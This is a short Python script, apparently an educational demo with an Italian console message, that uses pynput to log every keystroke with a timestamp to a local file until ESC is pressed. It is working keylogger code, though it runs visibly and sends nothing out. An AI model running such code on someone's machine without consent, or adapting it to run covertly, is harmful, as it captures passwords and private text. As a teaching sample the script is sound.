from pynput import keyboard
from datetime import datetime


def on_press(key):
	try:
		tasto = key.char
	except AttributeError:
		tasto = str(key)

	timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

	with open("keylog.txt", "a") as log_file:
		log_file.write(f"[{timestamp}] {tasto}\n")

	if key == keyboard.Key.esc:
		return False


if __name__ == "__main__":
	print("⚠️  Keylogger didattico in esecuzione - premi ESC per fermare")
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
